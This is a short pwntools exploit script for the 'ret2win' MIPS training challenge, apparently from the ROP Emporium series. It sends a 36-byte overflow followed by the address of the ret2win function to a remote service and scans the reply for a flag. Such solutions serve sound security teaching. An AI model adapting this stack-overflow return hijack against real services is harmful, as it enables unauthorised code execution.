from pwn import *
import re

BINARY = "./ret2win_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

p = remote("10.0.0.2", 9999)

rop = b"A" * 36
rop += p32(ELF.symbols["ret2win"])
with open("raw", "wb") as f:
    f.write(rop)
p.recv()
p.sendline(rop)
for each in p.recvlines(10):
    if re.findall("ROPE", str(each)):
        flag = each
print(flag)
